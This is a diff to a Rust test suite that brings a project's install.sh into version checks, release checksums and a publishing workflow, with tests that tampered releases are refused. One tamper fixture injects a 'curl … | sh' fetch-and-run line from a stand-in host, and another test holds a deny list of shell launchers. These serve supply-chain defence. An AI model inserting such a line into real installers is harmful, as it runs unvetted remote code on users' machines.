@@ -242,6 +242,7 @@ fn the_paths_decide_between_a_full_release_a_patch_and_none() {
         "deploy/systemd/arca-watch.service",
         "schema/arca.openrpc.json",
         "scripts/release.sh",
+        "scripts/install.sh",
     ] {
         scratch.commit(path, "fix(canvas): a part");
         assert_eq!(scratch.answer(&["kind"]), "patch", "{path} is a patch");
@@ -293,6 +294,7 @@ fn copy_version_files(scratch: &Scratch) {
         "Cargo.lock".to_string(),
         "packages/arca-canvas-dsh/package.json".to_string(),
         "packages/arca-canvas-dsh/package-lock.json".to_string(),
+        "scripts/install.sh".to_string(),
     ];
     for entry in fs::read_dir(repo.join("crates")).expect("the crates directory") {
         let dir = entry.expect("a crate directory").path();
@@ -355,6 +357,7 @@ fn set_writes_the_version_into_every_field_and_touches_no_other_line() {
         "Cargo.lock",
         "packages/arca-canvas-dsh/package.json",
         "packages/arca-canvas-dsh/package-lock.json",
+        "scripts/install.sh",
     ]
     .iter()
     .map(|file| scratch.read(file))
@@ -392,6 +395,16 @@ fn set_writes_the_version_into_every_field_and_touches_no_other_line() {
         ),
         2,
         "the lock's own version and its root package's"
+    );
+    assert_eq!(
+        changed_lines(&before[4], &scratch.read("scripts/install.sh")),
+        1,
+        "the release the installer installs"
+    );
+    assert!(
+        scratch
+            .read("scripts/install.sh")
+            .contains("\nARCA_VERSION=0.8.0\n")
     );
     // No dependency in the lock took the number: the lines that say it are the ones that said it before, and the crates'.
     assert_eq!(
@@ -453,6 +466,201 @@ fn set_writes_nothing_when_a_field_is_missing() {
     );
     assert_eq!(scratch.read("Cargo.toml"), manifest, "nothing was written");
     assert_eq!(scratch.read("Cargo.lock"), lock);
+}
+
+#[test]
+fn the_installer_s_version_line_is_one_field_like_the_others() {
+    let installer = "scripts/install.sh";
+    let line = format!("ARCA_VERSION={}\n", env!("CARGO_PKG_VERSION"));
+    let own = fs::read_to_string(Path::new(REPO).join(installer)).expect("the installer");
+    assert_eq!(
+        own.matches("\nARCA_VERSION=").count(),
+        1,
+        "the installer names the release it installs on one line"
+    );
+    assert!(own.contains(&format!("\n{line}")));
+
+    // An installer left at another number is drift, named like any other field's.
+    let scratch = Scratch::new("installer");
+    copy_version_files(&scratch);
+    scratch.write(installer, &own.replacen(&line, "ARCA_VERSION=0.7.0\n", 1));
+    let drift = scratch.version(&["check"]);
+    assert_eq!(drift.status.code(), Some(1));
+    let said = String::from_utf8_lossy(&drift.stderr);
+    assert!(
+        said.contains(&format!(
+            "scripts/install.sh ARCA_VERSION = 0.7.0, not {}",
+            env!("CARGO_PKG_VERSION")
+        )),
+        "{said}"
+    );
+    assert_eq!(scratch.answer(&["set", "0.8.0"]), "version: 0.8.0");
+    assert_eq!(scratch.answer(&["check"]), "version: 0.8.0 everywhere");
+
+    // A line the script cannot read as the one field is a missing field: the check fails, and set writes nothing.
+    let manifest = scratch.read("Cargo.toml");
+    for (shape, text) in [
+        ("no line", "".to_string()),
+        ("quoted", "ARCA_VERSION=\"0.8.0\"\n".to_string()),
+        (
+            "two lines",
+            "ARCA_VERSION=0.8.0\nARCA_VERSION=0.8.0\n".to_string(),
+        ),
+        ("a command", "ARCA_VERSION=$(cat VERSION)\n".to_string()),
+        ("indented", "    ARCA_VERSION=0.8.0\n".to_string()),
+    ] {
+        let broken = own.replacen(&line, &text, 1);
+        scratch.write(installer, &broken);
+        let check = scratch.version(&["check"]);
+        assert_eq!(check.status.code(), Some(1), "{shape}");
+        assert!(
+            String::from_utf8_lossy(&check.stderr)
+                .contains("scripts/install.sh has no ARCA_VERSION"),
+            "{shape}"
+        );
+        let set = scratch.version(&["set", "0.9.0"]);
+        assert_eq!(set.status.code(), Some(1), "{shape}");
+        assert!(
+            String::from_utf8_lossy(&set.stderr)
+                .contains("scripts/install.sh has no ARCA_VERSION; nothing was written"),
+            "{shape}"
+        );
+        assert_eq!(
+            scratch.read("Cargo.toml"),
+            manifest,
+            "{shape}: nothing was written"
+        );
+        assert_eq!(scratch.read(installer), broken, "{shape}");
+    }
+    // The installer gone is the same refusal.
+    fs::remove_file(scratch.0.join(installer)).expect("remove");
+    let gone = scratch.version(&["check"]);
+    assert_eq!(gone.status.code(), Some(1));
+    assert!(
+        String::from_utf8_lossy(&gone.stderr).contains("scripts/install.sh has no ARCA_VERSION")
+    );
+}
+
+/// scripts/release.sh, run whole in a scratch repository whose build is a stand-in that reports a program saying the
+/// right version line. The script's own steps are the real ones.
+#[test]
+fn the_release_files_carry_the_installer_and_an_installer_at_another_version_stops_the_release() {
+    let scratch = Scratch::new("release-sh");
+    for script in ["scripts/release.sh", "scripts/install.sh"] {
+        scratch.write(
+            script,
+            &fs::read_to_string(Path::new(REPO).join(script)).expect("the script"),
+        );
+    }
+    scratch.write(
+        "Cargo.toml",
+        "[workspace]\n\n[workspace.package]\nversion = \"0.8.0\"\n",
+    );
+    scratch.write(
+        "CHANGELOG.md",
+        "# Changelog\n\n## Unreleased\n\n## 0.8.0 (2026-11-12)\n\n- a change\n",
+    );
+    scratch.write(".gitignore", "/dist/\n/out/\n");
+    // The stand-in build: a program that says the version line of whatever commit is checked out.
+    scratch.write(
+        "scripts/build-portable.sh",
+        "#!/usr/bin/env bash\nset -euo pipefail\nmkdir -p out\nprintf '#!/bin/sh\\necho \"Automagik Arca 0.8.0 (%s, x86_64-unknown-linux-gnu)\"\\n' \"$(git rev-parse --short HEAD)\" > out/arca\nchmod 0755 out/arca\necho \"binary: $PWD/out/arca\"\necho \"max GLIBC: 2.34\"\n",
+    );
+    fs::set_permissions(
+        scratch.0.join("scripts/build-portable.sh"),
+        fs::Permissions::from_mode(0o755),
+    )
+    .expect("mode");
+    let release = |scratch: &Scratch| {
+        Command::new("bash")
+            .arg(scratch.0.join("scripts/release.sh"))
+            .env("GIT_CONFIG_GLOBAL", "/dev/null")
+            .env("GIT_CONFIG_SYSTEM", "/dev/null")
+            .output()
+            .expect("run scripts/release.sh")
+    };
+
+    // The installer still names the release before: nothing is built, and no file is written.
+    scratch.git(&["add", "-A"]);
+    scratch.git(&["commit", "-q", "-m", "chore(release): v0.8.0"]);
+    scratch.tag("v0.8.0");
+    let refused = release(&scratch);
+    assert_eq!(refused.status.code(), Some(1));
+    let said = String::from_utf8_lossy(&refused.stderr);
+    assert!(
+        said.contains(&format!(
+            "scripts/install.sh installs \"{}\", not 0.8.0",
+            env!("CARGO_PKG_VERSION")
+        )),
+        "{said}"
+    );
+    assert!(!scratch.0.join("dist").exists() && !scratch.0.join("out").exists());
+
+    // With the installer at the release's version, the files are the binary, the installer as the commit holds it,
+    // the checksums of those two in that order, and the notes.
+    scratch.git(&["tag", "-d", "v0.8.0"]);
+    let own = scratch.read("scripts/install.sh");
+    let installer = own.replacen(
+        &format!("\nARCA_VERSION={}\n", env!("CARGO_PKG_VERSION")),
+        "\nARCA_VERSION=0.8.0\n",
+        1,
+    );
+    scratch.write("scripts/install.sh", &installer);
+    scratch.git(&["commit", "-q", "-am", "chore(release): v0.8.0"]);
+    scratch.tag("v0.8.0");
+    let built = release(&scratch);
+    assert!(
+        built.status.success(),
+        "{}",
+        String::from_utf8_lossy(&built.stderr)
+    );
+    let mut files: Vec<String> = fs::read_dir(scratch.0.join("dist"))
+        .expect("dist")
+        .map(|entry| {
+            entry
+                .expect("an entry")
+                .file_name()
+                .to_string_lossy()
+                .to_string()
+        })
+        .collect();
+    files.sort();
+    assert_eq!(
+        files,
+        [
+            "RELEASE-NOTES.md",
+            "SHA256SUMS",
+            "arca-0.8.0-linux-x86_64",
+            "install.sh"
+        ]
+    );
+    assert_eq!(scratch.read("dist/install.sh"), installer);
+    assert_eq!(
+        scratch.git(&["hash-object", "--no-filters", "dist/install.sh"]),
+        scratch.git(&["rev-parse", "v0.8.0:scripts/install.sh"]),
+        "byte for byte the tag's installer"
+    );
+    let sums = scratch.read("dist/SHA256SUMS");
+    let names: Vec<&str> = sums
+        .lines()
+        .filter_map(|line| line.split_once("  "))
+        .map(|(_, name)| name)
+        .collect();
+    assert_eq!(names, ["arca-0.8.0-linux-x86_64", "install.sh"]);
+    let checked = Command::new("sha256sum")
+        .args(["--check", "--strict", "--quiet", "SHA256SUMS"])
+        .current_dir(scratch.0.join("dist"))
+        .output()
+        .expect("run sha256sum");
+    assert!(checked.status.success());
+    let notes = scratch.read("dist/RELEASE-NOTES.md");
+    assert!(notes.starts_with("- a change\n"), "{notes}");
+    assert!(notes.contains("`sha256sum --check --ignore-missing SHA256SUMS`"));
+    let said = String::from_utf8_lossy(&built.stdout);
+    assert!(
+        said.contains("dist/arca-0.8.0-linux-x86_64 dist/install.sh dist/SHA256SUMS"),
+        "{said}"
+    );
 }
 
 const CHANGELOG: &str = "# Changelog\n\nWhat changed.\n\n## Unreleased\n\n<!-- Write here what a reader should know.\nThe release moves it. -->\n\n## 0.1.0-alpha.7\n\nThe first one.\n";
@@ -797,7 +1005,6 @@ fn the_jobs_that_can_write_run_nothing_of_the_repository() {
         assert!(text.contains("    permissions:\n      contents: write\n"));
         assert_eq!(text.matches("permissions:").count(), 1);
         for never in [
-            "scripts/",
             "cargo",
             "rustup",
             "npm",
@@ -816,6 +1023,58 @@ fn the_jobs_that_can_write_run_nothing_of_the_repository() {
             assert!(
                 !text.contains(never),
                 "the {name} job runs nothing of the repository: no {never}"
+            );
+        }
+    }
+    // No script of the repository is named in them, but for one path in the publishing job: the installer's, held in
+    // one variable. It names a file inside a commit, which git reads as data: every use of it follows the `:` of an
+    // object name, or is the argument of one of the two helpers that read a file of a commit, or the last of the list
+    // of files a release commit may change, or stands in the words of a refusal. No command starts with it, and no
+    // command is a shell handed a file.
+    assert!(!job(&rules, "main").contains("scripts/"));
+    assert!(!job(&rules, "main").contains("install.sh"));
+    let publish = job(&rules, "publish");
+    assert_eq!(publish.matches("scripts/").count(), 1);
+    assert!(publish.contains("\n          INSTALLER=\"scripts/install.sh\"\n"));
+    assert!(
+        !publish.contains("$INSTALLER"),
+        "always written ${{INSTALLER}}"
+    );
+    for line in publish.lines() {
+        let command = line.trim_start();
+        for start in [
+            "\"${INSTALLER}",
+            "${INSTALLER}",
+            "./",
+            "\"./",
+            "install.sh",
+            "\"${HANDOVER}",
+            "${HANDOVER}",
+        ] {
+            assert!(
+                !command.starts_with(start),
+                "no command is a file: {command}"
+            );
+        }
+        for word in command.split_whitespace() {
+            assert!(
+                ![
+                    "sh", "bash", "dash", "exec", "xargs", "env", "command", "nohup", "timeout"
+                ]
+                .contains(&word),
+                "no command hands a file to a shell or to another program: {command}"
+            );
+        }
+        // The words of a refusal are words; what is before them is the command.
+        let command = command.split("stop \"").next().unwrap_or("");
+        for (at, _) in command.match_indices("${INSTALLER}") {
+            let before = &command[..at];
+            assert!(
+                before.ends_with(':')
+                    || before.ends_with("changes \"")
+                    || before.ends_with("where \"")
+                    || before.ends_with("\\n'\""),
+                "the installer's path is read with git, as data: {command}"
             );
         }
     }
@@ -840,7 +1099,6 @@ fn the_jobs_that_can_write_run_nothing_of_the_repository() {
             }
         }
     }
-    let publish = job(&rules, "publish");
     // The only actions beside the checkout: the one that fetches what the cutting job handed over.
     let uses: Vec<&str> = publish
         .lines()
@@ -855,6 +1113,14 @@ fn the_jobs_that_can_write_run_nothing_of_the_repository() {
     assert_eq!(rules.matches("refs/heads/dev").count(), 1);
     assert_eq!(rules.matches("gh release create").count(), 1);
     assert!(publish.contains("sha256sum --check --strict --quiet SHA256SUMS"));
+    // The installer is published as the release commit holds it, and the cutting job hands it over with the rest.
+    assert!(publish.contains(
+        "gh release create \"v${VERSION}\" \"arca-${VERSION}-linux-x86_64\" install.sh SHA256SUMS \"${flags[@]}\""
+    ));
+    assert!(publish.contains("git hash-object --no-filters \"${HANDOVER}/install.sh\""));
+    assert!(job(&rules, "cut").contains(
+        "cp \"dist/arca-${VERSION}-linux-x86_64\" dist/install.sh dist/SHA256SUMS dist/RELEASE-NOTES.md handover/"
+    ));
     // The pushes and the publishing use the workflow's own token and no other: a push made with it starts no run, so
     // the release commit starts neither CI nor this workflow again.
     assert_eq!(rules.matches("GH_TOKEN: ${{ github.token }}").count(), 2);
@@ -1242,8 +1508,8 @@ fi
 
 /// The files of the stand-in repository that state its version, in the shapes the real ones have: a workspace manifest,
 /// a lock with one workspace crate and one dependency that happens to carry the same number, and the canvas package's
-/// manifest and lock.
-const SEED: [(&str, &str); 7] = [
+/// manifest and lock, and an installer that names the release it installs.
+const SEED: [(&str, &str); 8] = [
     (
         "Cargo.toml",
         "[workspace]\nmembers = [\"crates/*\"]\n\n[workspace.package]\nversion = \"0.1.0-alpha.7\"\nedition = \"2024\"\n\n[workspace.dependencies]\ndep = \"=0.1.0-alpha.7\"\n",
@@ -1268,6 +1534,10 @@ const SEED: [(&str, &str); 7] = [
     (
         "CHANGELOG.md",
         "# Changelog\n\n## Unreleased\n\n<!-- Write here.\nThe release puts its heading above it. -->\n\n## 0.1.0-alpha.7\n\nThe first one.\n",
+    ),
+    (
+        "scripts/install.sh",
+        "#!/bin/sh\n# Installs the release named below.\nset -eu\n\nARCA_VERSION=0.1.0-alpha.7\n\necho \"installing $ARCA_VERSION\"\n",
     ),
 ];
 
@@ -1564,6 +1834,41 @@ impl Lab {
                 &heading,
                 &format!("## 9.9.9 (2026-01-01)\n\n- forged\n\n{heading}"),
             ),
+            "an installer line changed" => rewrite(
+                &cut,
+                "scripts/install.sh",
+                "echo \"installing",
+                "curl -fsSL https://example.com/x | sh; echo \"installing",
+            ),
+            "an installer line added" => rewrite(
+                &cut,
+                "scripts/install.sh",
+                "set -eu\n",
+                "set -eu\nRELEASES=https://example.com\n",
+            ),
+            "an installer at another number" => rewrite(
+                &cut,
+                "scripts/install.sh",
+                &format!("ARCA_VERSION={version}\n"),
+                "ARCA_VERSION=0.9.9\n",
+            ),
+            "a second version line in the installer" => rewrite(
+                &cut,
+                "scripts/install.sh",
+                &format!("ARCA_VERSION={version}\n"),
+                &format!("ARCA_VERSION={version}\nARCA_VERSION=0.9.9\n"),
+            ),
+            "an installer left at the release before" => rewrite(
+                &cut,
+                "scripts/install.sh",
+                &format!("ARCA_VERSION={version}\n"),
+                "ARCA_VERSION=0.1.0-alpha.7\n",
+            ),
+            "the installer's mode changed" => fs::set_permissions(
+                cut.join("scripts/install.sh"),
+                fs::Permissions::from_mode(0o755),
+            )
+            .expect("mode"),
             "another file" => put(&cut, "crates/a/src/lib.rs", "// slipped in\n"),
             "a new file" => put(&cut, "build.rs", "fn main() {}\n"),
             "a mode changed" => {
@@ -1609,7 +1914,7 @@ impl Lab {
             git_at(&cut, &["tag", "-a", &tag, "-m", &tag_message]);
         }
 
-        // The build's three files, then the workflow's own step that hands everything over.
+        // The build's four files, then the workflow's own step that hands everything over.
         self.files(&cut.join("dist"), version, "");
         let handed = self.step("Hand over", &cut, &[("MODE", "cut"), ("VERSION", version)]);
         assert_eq!(handed.code, Some(0), "{}", handed.said);
@@ -1652,40 +1957,83 @@ impl Lab {
         }
     }
 
-    /// The three release files, as scripts/release.sh leaves them. `twist` names one thing wrong with them.
+    /// The four release files, as scripts/release.sh leaves them: the installer is the cutting job's checkout's own.
+    /// `twist` names one thing wrong with them.
     fn files(&self, dir: &Path, version: &str, twist: &str) {
         fs::create_dir_all(dir).expect("the directory");
         let asset = format!("arca-{version}-linux-x86_64");
         fs::write(dir.join(&asset), "a binary\n").expect("write");
-        let sums = Command::new("sha256sum")
-            .arg(&asset)
-            .current_dir(dir)
-            .output()
-            .expect("run sha256sum");
-        let sums = String::from_utf8(sums.stdout).expect("text");
-        fs::write(dir.join("SHA256SUMS"), &sums).expect("write");
+        fs::copy(
+            self.dir().join("cut/scripts/install.sh"),
+            dir.join("install.sh"),
+        )
+        .expect("the installer");
         fs::write(dir.join("RELEASE-NOTES.md"), "- a change\n").expect("write");
+        let sums_of = |names: &[&str]| {
+            let out = Command::new("sha256sum")
+                .args(names)
+                .current_dir(dir)
+                .output()
+                .expect("run sha256sum");
+            String::from_utf8(out.stdout).expect("text")
+        };
+        let sums = sums_of(&[&asset, "install.sh"]);
+        fs::write(dir.join("SHA256SUMS"), &sums).expect("write");
         match twist {
             "another binary" => fs::write(dir.join(&asset), "another binary\n").expect("write"),
-            "an extra file" => fs::write(dir.join("install.sh"), "echo\n").expect("write"),
+            "an extra file" => fs::write(dir.join("notes.txt"), "words\n").expect("write"),
             "a file missing" => fs::remove_file(dir.join("RELEASE-NOTES.md")).expect("remove"),
-            // A second line that is itself true: only the count of lines is wrong.
-            "a second checksum" => {
-                let notes = Command::new("sha256sum")
-                    .arg("RELEASE-NOTES.md")
-                    .current_dir(dir)
-                    .output()
-                    .expect("run sha256sum");
-                let both = format!("{sums}{}", String::from_utf8_lossy(&notes.stdout));
+            "the installer missing" => fs::remove_file(dir.join("install.sh")).expect("remove"),
+            // A third line that is itself true: only the count of lines is wrong.
+            "a third checksum" => {
+                let both = format!("{sums}{}", sums_of(&["RELEASE-NOTES.md"]));
                 fs::write(dir.join("SHA256SUMS"), both).expect("write");
+            }
+            // The same third line, not ended: a count of line ends alone would call it two lines.
+            "a third checksum on a line not ended" => {
+                let both = format!("{sums}{}", sums_of(&["RELEASE-NOTES.md"]).trim_end());
+                fs::write(dir.join("SHA256SUMS"), both).expect("write");
+            }
+            "the binary's checksum alone" => {
+                fs::write(dir.join("SHA256SUMS"), sums_of(&[&asset])).expect("write")
             }
             "a checksum of another name" => {
                 fs::write(dir.join("SHA256SUMS"), sums.replace(&asset, "arca")).expect("write")
+            }
+            "the checksums the other way round" => {
+                fs::write(dir.join("SHA256SUMS"), sums_of(&["install.sh", &asset])).expect("write")
+            }
+            // Two true lines, and the second is not the installer's.
+            "the notes' checksum for the installer's" => fs::write(
+                dir.join("SHA256SUMS"),
+                sums_of(&[&asset, "RELEASE-NOTES.md"]),
+            )
+            .expect("write"),
+            "an installer that is not the one its checksum names" => {
+                fs::write(dir.join("install.sh"), "#!/bin/sh\necho another\n").expect("write")
+            }
+            // Another installer whose checksum is right: the file and SHA256SUMS agree, and the commit does not.
+            "another installer under a true checksum" => {
+                let own = fs::read_to_string(dir.join("install.sh")).expect("read");
+                fs::write(
+                    dir.join("install.sh"),
+                    own.replace("echo \"installing", "echo \"also installing"),
+                )
+                .expect("write");
+                fs::write(dir.join("SHA256SUMS"), sums_of(&[&asset, "install.sh"])).expect("write");
             }
             "a link" => {
                 fs::remove_file(dir.join("RELEASE-NOTES.md")).expect("remove");
                 std::os::unix::fs::symlink(dir.join("SHA256SUMS"), dir.join("RELEASE-NOTES.md"))
                     .expect("link");
+            }
+            "the installer as a link" => {
+                fs::remove_file(dir.join("install.sh")).expect("remove");
+                std::os::unix::fs::symlink(
+                    self.dir().join("cut/scripts/install.sh"),
+                    dir.join("install.sh"),
+                )
+                .expect("link");
             }
             _ => {}
         }
@@ -1789,12 +2137,21 @@ fn the_publishing_job_checks_what_it_was_handed_pushes_both_at_once_and_publishe
             .contains("name = \"dep\"\nversion = \"0.1.0-alpha.7\""),
         "a dependency with the same number is not the workspace's"
     );
+    // The installer that landed installs this release, and the one handed over to be published is that file.
+    let landed = lab.remote(&["show", "dev:scripts/install.sh"]);
+    assert!(landed.contains("\nARCA_VERSION=0.8.0\n"), "{landed}");
+    assert_eq!(
+        fs::read_to_string(lab.handed().join("install.sh"))
+            .expect("the installer")
+            .trim_end(),
+        landed
+    );
 
     let done = lab.step("Publish the release", &publish, &env);
     assert_eq!(done.code, Some(0), "{}", done.said);
     assert_eq!(
         lab.created(),
-        "release create v0.8.0 arca-0.8.0-linux-x86_64 SHA256SUMS --latest --repo automagik-si/arca --verify-tag \
+        "release create v0.8.0 arca-0.8.0-linux-x86_64 install.sh SHA256SUMS --latest --repo automagik-si/arca --verify-tag \
          --title Automagik Arca 0.8.0 --notes-file RELEASE-NOTES.md\n"
     );
     assert_eq!(
@@ -1899,7 +2256,7 @@ fn when_dev_moves_between_the_check_and_the_push_neither_the_commit_nor_the_tag_
 
 /// Each way a handover is not exactly a release, with the words of the one check that must catch it. Every other part
 /// of each handover is right, so the words name the check that fired.
-const REFUSED: [(&str, &str); 46] = [
+const REFUSED: [(&str, &str); 60] = [
     // The files.
     (
         "an extra file",
@@ -1909,18 +2266,48 @@ const REFUSED: [(&str, &str); 46] = [
         "a file missing",
         "the handed-over files are not the expected ones",
     ),
+    (
+        "the installer missing",
+        "the handed-over files are not the expected ones",
+    ),
     ("a link", "is not a plain file"),
     (
-        "a second checksum",
-        "SHA256SUMS does not hold exactly one line",
+        "the installer as a link",
+        "./install.sh is not a plain file",
+    ),
+    (
+        "a third checksum",
+        "SHA256SUMS does not hold exactly two lines",
+    ),
+    (
+        "a third checksum on a line not ended",
+        "SHA256SUMS does not hold exactly two lines",
+    ),
+    (
+        "the binary's checksum alone",
+        "SHA256SUMS does not hold exactly two lines",
     ),
     (
         "a checksum of another name",
-        "SHA256SUMS does not name arca-0.8.0-linux-x86_64",
+        "SHA256SUMS does not name arca-0.8.0-linux-x86_64 with a SHA-256 on its first line",
     ),
     (
-        "another binary",
-        "arca-0.8.0-linux-x86_64 does not match SHA256SUMS",
+        "the checksums the other way round",
+        "SHA256SUMS does not name arca-0.8.0-linux-x86_64 with a SHA-256 on its first line",
+    ),
+    (
+        "the notes' checksum for the installer's",
+        "SHA256SUMS does not name install.sh with a SHA-256 on its second line",
+    ),
+    ("another binary", "a release file does not match SHA256SUMS"),
+    (
+        "an installer that is not the one its checksum names",
+        "a release file does not match SHA256SUMS",
+    ),
+    // The installer that would be published is not the one the release commit holds.
+    (
+        "another installer under a true checksum",
+        "install.sh is not the release commit's scripts/install.sh",
     ),
     // The bundle.
     (
@@ -1965,9 +2352,17 @@ const REFUSED: [(&str, &str); 46] = [
         "the tag's message is not exactly Automagik Arca 0.8.0",
     ),
     // Which files the commit changes, and what kind of thing each is.
-    ("another file", "does not change exactly the five files"),
-    ("a new file", "does not change exactly the five files"),
+    ("another file", "does not change exactly the six files"),
+    ("a new file", "does not change exactly the six files"),
+    (
+        "an installer left at the release before",
+        "does not change exactly the six files",
+    ),
     ("a mode changed", "changes a file's kind or mode"),
+    (
+        "the installer's mode changed",
+        "changes a file's kind or mode",
+    ),
     ("a file turned into a link", "changes a file's kind or mode"),
     (
         "a file turned into a submodule entry",
@@ -2013,6 +2408,23 @@ const REFUSED: [(&str, &str); 46] = [
     (
         "a dependency's lock version",
         "package-lock.json changes something other than its two version lines",
+    ),
+    // The installer: its one version line, and no other byte.
+    (
+        "an installer line changed",
+        "scripts/install.sh changes something other than its ARCA_VERSION line",
+    ),
+    (
+        "an installer line added",
+        "scripts/install.sh changes something other than its ARCA_VERSION line",
+    ),
+    (
+        "an installer at another number",
+        "scripts/install.sh changes something other than its ARCA_VERSION line",
+    ),
+    (
+        "a second version line in the installer",
+        "scripts/install.sh changes something other than its ARCA_VERSION line",
     ),
     // The changelog: nothing removed or changed, one heading in its place, and list lines.
     (
@@ -2140,9 +2552,20 @@ fn the_publishing_job_refuses_a_wrong_name_a_taken_tag_and_a_published_release()
     assert!(taken.said.contains("v0.8.0 is already on the remote"));
 }
 
-/// The four version lines of the stand-in repository, moved by hand from the old numbering to `version`.
+/// The installer's version line of the stand-in repository, moved by hand from the old numbering to `version`.
+fn bump_installer(cut: &Path, version: &str) {
+    rewrite(
+        cut,
+        "scripts/install.sh",
+        "ARCA_VERSION=0.1.0-alpha.7\n",
+        &format!("ARCA_VERSION={version}\n"),
+    );
+}
+
+/// The version lines of the stand-in repository, moved by hand from the old numbering to `version`.
 fn bump_by_hand(cut: &Path, version: &str) {
     let lock = "packages/arca-canvas-dsh/package-lock.json";
+    bump_installer(cut, version);
     rewrite(
         cut,
         "Cargo.toml",
@@ -2233,6 +2656,7 @@ fn when_dev_s_own_files_are_not_as_expected_the_publishing_job_says_which_and_wh
             "  \"version\": \"0.1.0-alpha.7\"",
             "  \"version\": \"0.8.0\"",
         );
+        bump_installer(cut, "0.8.0");
         lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
     });
     refused(
@@ -2275,6 +2699,7 @@ fn when_dev_s_own_files_are_not_as_expected_the_publishing_job_says_which_and_wh
             "  \"version\": \"0.1.0-alpha.7\"",
             "  \"version\": \"0.8.0\"",
         );
+        bump_installer(cut, "0.8.0");
         lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
     });
     refused(
@@ -2318,6 +2743,7 @@ fn when_dev_s_own_files_are_not_as_expected_the_publishing_job_says_which_and_wh
             "\"name\": \"arca-canvas-dsh\",\n      \"version\": \"0.1.0-alpha.7\"",
             "\"name\": \"arca-canvas-dsh\",\n      \"version\": \"0.8.0\"",
         );
+        bump_installer(cut, "0.8.0");
         lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
     });
     refused(
@@ -2385,6 +2811,7 @@ fn when_dev_s_own_files_are_not_as_expected_the_publishing_job_says_which_and_wh
             "  \"version\": \"0.1.0-alpha.7\"",
             "  \"version\": \"0.8.0\"",
         );
+        bump_installer(cut, "0.8.0");
         lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
     });
     refused(
@@ -2412,6 +2839,100 @@ fn when_dev_s_own_files_are_not_as_expected_the_publishing_job_says_which_and_wh
         );
     });
     refused(&lab, "the section for 0.8.0 is not new");
+
+    // dev's own installer names another release than the workspace's version.
+    let lab = Lab::new("installer-drift");
+    lab.dev_changes("chore: an installer at another number", |dev| {
+        rewrite(
+            dev,
+            "scripts/install.sh",
+            "ARCA_VERSION=0.1.0-alpha.7\n",
+            "ARCA_VERSION=0.0.1\n",
+        )
+    });
+    lab.hand_over_written("0.8.0", "", |cut| {
+        rewrite(
+            cut,
+            "scripts/install.sh",
+            "ARCA_VERSION=0.0.1\n",
+            "ARCA_VERSION=0.1.0-alpha.7\n",
+        );
+        bump_by_hand(cut, "0.8.0");
+        lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
+    });
+    refused(
+        &lab,
+        "dev's own scripts/install.sh does not say ARCA_VERSION=0.1.0-alpha.7 at line 5",
+    );
+
+    // dev's own installer states its release in a way the check does not read.
+    let lab = Lab::new("installer-quoted");
+    lab.dev_changes("chore: quotes in the installer", |dev| {
+        rewrite(
+            dev,
+            "scripts/install.sh",
+            "ARCA_VERSION=0.1.0-alpha.7\n",
+            "ARCA_VERSION=\"0.1.0-alpha.7\"\n",
+        )
+    });
+    lab.hand_over_written("0.8.0", "", |cut| {
+        rewrite(
+            cut,
+            "scripts/install.sh",
+            "ARCA_VERSION=\"0.1.0-alpha.7\"\n",
+            "ARCA_VERSION=0.1.0-alpha.7\n",
+        );
+        bump_by_hand(cut, "0.8.0");
+        lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
+    });
+    refused(
+        &lab,
+        "dev's own scripts/install.sh does not say ARCA_VERSION=0.1.0-alpha.7 at line 5",
+    );
+
+    // dev's own installer has two lines that state a release: nobody could say which one it installs.
+    let lab = Lab::new("installer-two");
+    lab.dev_changes("chore: a second version line", |dev| {
+        rewrite(
+            dev,
+            "scripts/install.sh",
+            "set -eu\n",
+            "set -eu\nARCA_VERSION=0.0.1\n",
+        )
+    });
+    lab.hand_over_written("0.8.0", "", |cut| {
+        bump_by_hand(cut, "0.8.0");
+        lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
+    });
+    refused(
+        &lab,
+        "dev's own scripts/install.sh does not have exactly one ARCA_VERSION line",
+    );
+
+    // dev's own installer has no such line at all.
+    let lab = Lab::new("installer-none");
+    lab.dev_changes("chore: no version line", |dev| {
+        rewrite(
+            dev,
+            "scripts/install.sh",
+            "ARCA_VERSION=0.1.0-alpha.7\n",
+            "VERSION=0.1.0-alpha.7\n",
+        )
+    });
+    lab.hand_over_written("0.8.0", "", |cut| {
+        rewrite(
+            cut,
+            "scripts/install.sh",
+            "VERSION=0.1.0-alpha.7\n",
+            "ARCA_VERSION=0.1.0-alpha.7\n",
+        );
+        bump_by_hand(cut, "0.8.0");
+        lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
+    });
+    refused(
+        &lab,
+        "dev's own scripts/install.sh does not have exactly one ARCA_VERSION line",
+    );
 }
 
 #[test]
@@ -2506,6 +3027,24 @@ fn a_tag_that_was_pushed_and_never_published_is_finished_and_nothing_new_is_cut(
     let _ = fs::remove_dir_all(lab.temp());
     fs::create_dir_all(lab.temp()).expect("the temporary directory");
     fs::rename(again.join("handover"), lab.handed()).expect("the handover moves");
+
+    // An installer that is not the tag's own is not published, though its checksum is true.
+    lab.files(
+        &lab.handed(),
+        "0.8.0",
+        "another installer under a true checksum",
+    );
+    let (_, forged) = lab.check("finish", "0.8.0");
+    assert_eq!(forged.code, Some(1), "{}", forged.said);
+    assert!(
+        forged
+            .said
+            .contains("install.sh is not the release commit's scripts/install.sh"),
+        "{}",
+        forged.said
+    );
+    assert!(!forged.outputs.contains_key("commit"));
+    lab.files(&lab.handed(), "0.8.0", "");
 
     // The publishing job pushes nothing and publishes the tag's commit.
     let (publish, check) = lab.check("finish", "0.8.0");
